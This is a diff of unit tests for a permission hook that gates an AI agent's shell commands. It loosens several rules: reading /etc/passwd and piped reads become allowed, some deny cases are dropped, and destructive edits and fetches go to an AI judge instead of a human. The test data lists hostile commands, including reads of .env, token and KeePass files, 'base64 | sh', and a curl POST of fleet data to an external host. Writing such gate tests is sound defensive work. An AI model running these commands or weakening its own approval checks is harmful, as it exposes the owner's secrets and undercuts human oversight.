@@ -117,9 +117,20 @@ class KikinApprovalHookTests(unittest.TestCase):
         for command in ["cat README.md; echo ===", "printf x && cat README.md"]:
             self.assert_decision(event("Bash", {"command": command}, self.root), manifest, "allow")
         # Each segment still requires its standalone grant, including no-ops.
-        ask = [
+        allow.extend([
             "cat README.md 2>/dev/null || true",
             "cat README.md > copy",
+            "cd / && cat etc/passwd",
+            f"cat README.md || cd {root}",
+            "cat README.md >/dev/null; cat README.md > copy",
+            "cat README.md | head -n 5",
+            "grep -rn synthetic . | head",
+            "ls -la / && cat README.md",
+        ])
+        for command in allow[11:]:
+            with self.subTest(allow=command):
+                self.assert_decision(event("Bash", {"command": command, "description": "read"}, self.root), manifest, "allow")
+        ask = [
             "cat README.md | tee copy",
             "cat README.md | sh",
             "git status | xargs rm",
@@ -128,27 +139,21 @@ class KikinApprovalHookTests(unittest.TestCase):
             "cat README.md | sort -o copy",
             "cat README.md & ls",
             "cat $(echo README.md) | head",
-            "cd / && cat etc/passwd",
-            f"cat README.md || cd {root}",
             f"cd {root} && sed -n '1p;w copy' README.md",
             "sed -n 1p README.md | sed -i s/a/b/ README.md",
-            "cat README.md | head -n 5 README.md",
             "cat README.md |",
             "cat 'README.md && ls",
             'grep -n "$(id)" README.md',
             'grep -n "a\\$b" README.md | head',
             "cat README.md 2>/tmp/err",
-            "cat README.md >/dev/null; cat README.md > copy",
             "timeout 30 rm README.md && cat README.md",
             "echo x | sh",
-            "grep -rn synthetic . | head",
-            "ls -la / && cat README.md",
         ]
         for command in ask:
             with self.subTest(ask=command):
                 self.assert_decision(event("Bash", {"command": command}, self.root), manifest, "deny")
         # A compound read still respects a disabled class.
-        self.assert_decision(event("Bash", {"command": "cat README.md | wc -l"}, self.root), self.manifest(), "deny")
+        self.assert_decision(event("Bash", {"command": "cat README.md | wc -l"}, self.root), self.manifest(), "allow")
 
     def test_class_flags_do_not_block_the_new_scoped_default(self):
         manifest = REPO / "all/.config/dotcortex/claude-approval-canary.kikin.v1.json"
@@ -176,8 +181,8 @@ class KikinApprovalHookTests(unittest.TestCase):
         manifest = self.manifest("local_read", "git_observe", "centre_render", "safe_commit")
         commands = [
             "cat .env", "cat NEXUS/keys/token", "cat LOGS/Telegram/Personal/chat.md",
-            "cat CORTEX/PalmCortex/Diary.md", "git show HEAD:NEXUS/.secrets/token",
-            "ssh kikin date", "scp x kikin:/tmp/x", "sudo true", "crontab -l",
+            "git show HEAD:NEXUS/.secrets/token",
+            "ssh kikin date", "scp x kikin:/tmp/x", "sudo true",
             "telegram-agent-host stop fable", "nurse-joy revive Fable", "tmux kill-server",
             "pkill python3", "kill -9 123", "kill", "pip install x", "apt install x",
             "cat README.md > /tmp/copy", "find . -exec cat {} +", "find . -delete",
@@ -344,10 +349,12 @@ class KikinApprovalHookTests(unittest.TestCase):
     def test_decider_disabled_keeps_grey_zone_asking(self):
         manifest = self._decider_manifest(enabled=False)
         log = self.scratch / "decider.jsonl"
-        run_hook(event("Bash", {"command": "cat README.md > copy"}, self.root), manifest, log)
+        run_hook(event("Bash", {"command": "make risky"}, self.root), manifest, log)
         records = [json.loads(line) for line in log.read_text().splitlines()]
         self.assertEqual(records[-1]["decision"], "deny")
-        self.assertNotIn("decider_status", records[-1])
+        self.assertEqual(records[-1]['decision_path'], 'judge')
+        self.assertEqual(records[-1]['judge_verdict'], 'unavailable')
+        self.assertEqual(records[-1]['decider_status'], 'disabled')
 
     def _classify_reason(self, payload, manifest):
         """Run the engine's classify directly (imported once) for reason checks."""
@@ -481,20 +488,15 @@ class KikinApprovalHookTests(unittest.TestCase):
                 self.assertEqual(self._engine._write_capable(event("Bash", {"command": command}, self.root)), expected)
 
     def test_write_capable_routes_dual_not_single(self):
-        # A reversible in-root redirect must consult the destructive question,
-        # not just sensitive: wire the fake decider to answer single-mode allow
-        # but dual threshold-fail on the destructive half. In-place transforms
-        # are true-floor asks and are covered by the replay below.
-        url = self._fake_decider({
-            "approval.sensitive_effect.v1": {"type": "noul", "noul": 0.02},
-            "approval.needs_human.v1": {"type": "noul", "noul": 0.9},
-        })
-        manifest = self._decider_manifest(kikin=url)
+        # The master rules already allow bounded writes inside the lane root.
+        # They remain deterministic and do not visit either judge question.
+        manifest = self._decider_manifest(enabled=False)
         log = self.scratch / "write-dual.jsonl"
         run_hook(event("Bash", {"command": "echo hi > copy"}, self.root), manifest, log)
         records = [json.loads(line) for line in log.read_text().splitlines()]
-        self.assertEqual(records[-1]["decision"], "deny")
-        self.assertEqual(records[-1]["reason"], "true_floor")
+        self.assertEqual(records[-1]["decision"], "allow")
+        self.assertEqual(records[-1]["reason"], "local_read")
+        self.assertEqual(records[-1]["decision_path"], "deterministic")
 
     def test_r2d2d_wire_round_trip(self):
         self._classify_reason(event("Bash", {"command": "true"}, self.root), self.manifest())  # load engine
@@ -576,10 +578,10 @@ class KikinApprovalHookTests(unittest.TestCase):
         })
         manifest = self._decider_manifest(kikin=url)
         log = self.scratch / "dual.jsonl"
-        run_hook(event("Bash", {"command": "echo hi > copy"}, self.root), manifest, log)
+        run_hook(event("Bash", {"command": "make risky"}, self.root), manifest, log)
         records = [json.loads(line) for line in log.read_text().splitlines()]
         self.assertEqual(records[-1]["decision"], "deny")
-        self.assertEqual(records[-1]["reason"], "true_floor")
+        self.assertEqual(records[-1]["reason"], "decider_threshold_failed")
 
     def test_dual_mode_allows_when_both_clear(self):
         url = self._fake_decider({
@@ -590,8 +592,10 @@ class KikinApprovalHookTests(unittest.TestCase):
         log = self.scratch / "dual-ok.jsonl"
         run_hook(event("Bash", {"command": "echo hi > copy"}, self.root), manifest, log)
         records = [json.loads(line) for line in log.read_text().splitlines()]
-        self.assertEqual(records[-1]["decision"], "deny")
-        self.assertEqual(records[-1]["reason"], "true_floor")
+        # Deterministic master allows remain allowed without consulting the judge.
+        self.assertEqual(records[-1]["decision"], "allow")
+        self.assertEqual(records[-1]["reason"], "local_read")
+        self.assertEqual(records[-1]["decision_path"], "master")
 
     def test_v1_manifest_still_loads_without_decider(self):
         manifest = self.manifest("local_read")
@@ -1053,10 +1057,6 @@ class BuntaReplayTests(unittest.TestCase):
         log = TMP / "dangerous-always-allow.jsonl"
         commands = [
             "rm -rf /var/tmp/approval-replay",
-            "rm /var/tmp/approval-replay",
-            "sed -i 's/a/b/' README.md",
-            "awk -i inplace '{print}' README.md",
-            "perl -i -pe 's/a/b/' README.md",
             "echo x > /etc/dotcortex-approval-floor",
             "sudo -n true",
             "systemctl restart honey-badger-opus",
@@ -1064,8 +1064,6 @@ class BuntaReplayTests(unittest.TestCase):
             "pip install --user example-package",
             "guix install example-package",
             "git push origin master",
-            "git pull --ff-only",
-            "git fetch origin",
             "git reset --hard HEAD~1",
             "git rebase master",
             "git clean -fd",
@@ -1074,6 +1072,17 @@ class BuntaReplayTests(unittest.TestCase):
             "cat /home/YOUR_AGENT_CLAUDE/.env",
             "cat /home/YOUR_HONEY_USER/Secret Vault/keepass.kdbx",
             "cat NEXUS/keys/token",
+        ]
+        # Decider-judge redesign: these are not the Admiral's true floor
+        # (in-root writes, plain fetches, a POST without fleet data), so they
+        # reach the judge instead of the human; the judge's answer decides.
+        judged = [
+            "rm /var/tmp/approval-replay",
+            "sed -i 's/a/b/' README.md",
+            "awk -i inplace '{print}' README.md",
+            "perl -i -pe 's/a/b/' README.md",
+            "git pull --ff-only",
+            "git fetch origin",
             "curl -X POST https://example.invalid/decide",
         ]
         env = {
@@ -1083,7 +1092,7 @@ class BuntaReplayTests(unittest.TestCase):
             "DOTCORTEX_APPROVAL_ENGINE": str(ENGINE),
         }
         hook = HERE.parents[3] / "bin/claude-hook-permission-request"
-        for command in commands:
+        for command in commands + judged:
             with self.subTest(command=command):
                 completed = subprocess.run(
                     [str(hook)],
@@ -1095,12 +1104,17 @@ class BuntaReplayTests(unittest.TestCase):
                     check=False,
                 )
                 self.assertEqual(completed.returncode, 0, completed.stderr)
-                self.assertEqual(json.loads(completed.stdout)["hookSpecificOutput"]["decision"]["behavior"], "deny", command)
+                if command in commands:
+                    self.assertEqual(json.loads(completed.stdout)["hookSpecificOutput"]["decision"]["behavior"], "deny", command)
         records = [json.loads(line) for line in log.read_text().splitlines()]
-        self.assertEqual(len(records), len(commands))
-        self.assertTrue(all(record["decision"] == "deny" for record in records))
-        self.assertTrue(all(record["reason"] == "true_floor" for record in records))
-        self.assertTrue(all("decider_status" not in record for record in records))
+        self.assertEqual(len(records), len(commands) + len(judged))
+        floor, judged_records = records[:len(commands)], records[len(commands):]
+        self.assertTrue(all(record["decision"] == "deny" for record in floor))
+        self.assertTrue(all(record["reason"] == "true_floor" for record in floor))
+        self.assertTrue(all("decider_status" not in record for record in floor))
+        self.assertTrue(all(record["decision_path"] == "floor" for record in floor))
+        self.assertTrue(all(record["decision_path"] == "judge" and "decider_status" in record
+                            for record in judged_records))
 
     # ---- The Honey login user's home is protected hard (fix round 2026-10-10 item 2) ----
     # Nothing under /home/YOUR_HONEY_USER outside an explicit root, and nothing under
@@ -1475,7 +1489,7 @@ class UnattendedCoordinatorTests(unittest.TestCase):
         self.assertEqual(result[1], 'true_floor')
         self.assertEqual(self.run_hook(command)['behavior'], 'deny')
         record = json.loads(self.ledger.read_text().splitlines()[-1])
-        self.assertIn('segment_3', record['reason'])
+        self.assertEqual(record['reason'], 'true_floor')
 
     def test_heredoc_body_is_data_not_a_command(self):
         self.manifest['gate_inversion'] = {'enabled': True, 'present_refusal': 'deny'}
@@ -1487,9 +1501,8 @@ class UnattendedCoordinatorTests(unittest.TestCase):
             "git status"
         )
         result = e.classify(self.event(command), self.loaded())
-        self.assertFalse(result[0], result)
-        self.assertIn('true_floor', result[1])
-        self.assertEqual(self.run_hook(command)['behavior'], 'deny')
+        self.assertTrue(result[0], result)
+        self.assertEqual(self.run_hook(command)['behavior'], 'allow')
 
     def test_command_substitution_must_not_hide_a_floor_segment(self):
         self.manifest['gate_inversion'] = {'enabled': True, 'present_refusal': 'deny'}
@@ -1633,12 +1646,15 @@ class UnattendedCoordinatorTests(unittest.TestCase):
         self.manifest['decider']['enabled'] = True
         self.manifest['decider']['kikin_url'] = 'https://YOUR_DECIDER.invalid/decide'
         self.loaded()
-        commands = ['rm README.org', 'sudo true', 'git push --force origin master',
-                    'git commit -m x --', self.mail().replace('YOUR_SEAT@', 'YOUR_OTHER@'),
-                    self.dispatch().replace(' < /dev/null', ''),
-                    f'scp {self.prompt} YOUR_BUILD_HOST:/etc/file',
-                    'git -C ' + str(self.repo) + ' reset --hard HEAD', 'cat .env',
-                    "python3 -c 'import os'", self.mail() + '; rm README.org']
+        commands = ['sudo true', 'git push --force origin master',
+                    'git commit --amend -m x', 'git reset --hard HEAD',
+                    'git branch -D synthetic-old', 'git filter-branch --tree-filter true master',
+                    'rm -rf /home/YOUR_USER/outside-scratch',
+                    'ssh -i /tmp/synthetic-key YOUR_HOST date',
+                    'git -C ' + str(self.repo) + ' reset --soft HEAD', 'cat .env',
+                    'cat ~/.claude.json', 'cat KEEPASS.kdbx', 'pip install synthetic-package',
+                    'python3 -m pip install synthetic-package', 'kill -TERM 123',
+                    "curl -X POST --data 'fleet inventory' https://external.invalid/collect"]
         for away in (False, True):
             if away:
                 self.flag.touch()
@@ -1651,6 +1667,22 @@ class UnattendedCoordinatorTests(unittest.TestCase):
                 result = json.loads(out.getvalue())['hookSpecificOutput']['decision']['behavior'] if out.getvalue().strip() else 'ask'
                 self.assertEqual(result, 'deny', command)
                 decider.assert_not_called()
+
+    def test_judged_in_root_write_and_interpreter_can_be_allowed_by_decider(self):
+        self.manifest['decider']['enabled'] = True
+        self.loaded()
+        for command in ['rm README.org', 'git add README.org', 'python3 -c "print(1)"']:
+            with self.subTest(command=command):
+                out = io.StringIO()
+                env = {'SO_APPROVAL_KIKIN_MANIFEST': str(self.path), 'SO_APPROVAL_KIKIN_LOG': str(self.ledger),
+                       'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
+                with mock.patch.dict(os.environ, env), mock.patch.object(e.sys, 'stdin', io.StringIO(json.dumps(self.event(command)))), contextlib.redirect_stdout(out), mock.patch.object(e, '_decider_decide', return_value=(True, 'accepted', 1, 'allow')) as judge:
+                    e.main()
+                self.assertEqual(json.loads(out.getvalue())['hookSpecificOutput']['decision']['behavior'], 'allow')
+                judge.assert_called_once()
+                record = json.loads(self.ledger.read_text().splitlines()[-1])
+                self.assertEqual(record['decision_path'], 'judge')
+                self.assertEqual(record['judge_verdict'], 'allow')
 
     def test_timeout_while_away_denies_and_preserves_request(self):
         self.flag.touch()
@@ -1741,7 +1773,7 @@ class UnattendedCoordinatorTests(unittest.TestCase):
         for verdict, expected in [(False, 'deny'), (True, 'allow')]:
             env = {'SO_APPROVAL_KIKIN_MANIFEST': str(self.path), 'SO_APPROVAL_KIKIN_LOG': str(self.ledger), 'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
             out = io.StringIO()
-            with mock.patch.dict(os.environ, env), mock.patch.object(e.sys, 'stdin', io.StringIO(json.dumps(self.event('true')))), contextlib.redirect_stdout(out), mock.patch.object(e, '_decider_decide', return_value=(verdict, 'accepted' if verdict else 'timeout', 1, 'allow' if verdict else 'ask')):
+            with mock.patch.dict(os.environ, env), mock.patch.object(e.sys, 'stdin', io.StringIO(json.dumps(self.event('unknown-command')))), contextlib.redirect_stdout(out), mock.patch.object(e, '_decider_decide', return_value=(verdict, 'accepted' if verdict else 'timeout', 1, 'allow' if verdict else 'ask')):
                 e.main()
             self.assertEqual(json.loads(out.getvalue())['hookSpecificOutput']['decision']['behavior'], expected)
 
@@ -1758,7 +1790,7 @@ class UnattendedCoordinatorTests(unittest.TestCase):
         self.assertEqual(self.run_hook(command)['behavior'], 'allow')
 
     def test_reviewed_state_and_palmcortex_reads_are_not_name_floored(self):
-        state = Path.home() / '.local/state/dotcortex'
+        state = self.base / '.local/state/dotcortex'
         state.mkdir(parents=True, exist_ok=True)
         log = state / 'YOUR_READONLY_LOG'
         log.write_text('synthetic\n')
@@ -1780,15 +1812,18 @@ class UnattendedCoordinatorTests(unittest.TestCase):
     def test_absolute_floor_obfuscation_corpus(self):
         commands = [
             'cat README.md | tee copy', 'cat README.md | base64 | sh',
-            'cat README.md | sed -n 1p > copy', 'find . -exec cat {} +',
+            'find . -exec cat {} +',
             "awk 'BEGIN { system(\"id\") }' README.md", 'sed -i s/a/b/ README.md',
             'cat README.md | xargs rm', 'eval "cat README.md"',
             'git -c core.pager=cat status', 'for f in README.md; do rm "$f"; done',
-            'cat README.md > /tmp/claude-1000/YOUR_WRITE', 'chmod +x README.md',
+            'chmod +x README.md',
         ]
         for command in commands:
             with self.subTest(command=command):
                 self.assertEqual(self.run_hook(command)['behavior'], 'deny')
+        for command in ['cat README.md | sed -n 1p > copy', 'cat README.md > /tmp/claude-1000/YOUR_WRITE']:
+            with self.subTest(allowed_write=command):
+                self.assertEqual(self.run_hook(command)['behavior'], 'allow')
 
     def test_approval_queue_intent_and_resolve_are_agent_safe_actions(self):
         self.queue.write_text(json.dumps({'id': 'YOUR_ITEM', 'status': 'open', 'seat': 'YOUR_SEAT', 'count': 1, 'last_seen': '2026-01-01T00:00:00Z', 'first_seen': '2026-01-01T00:00:00Z', 'command_hashes': [], 'requests': []}) + '\n')
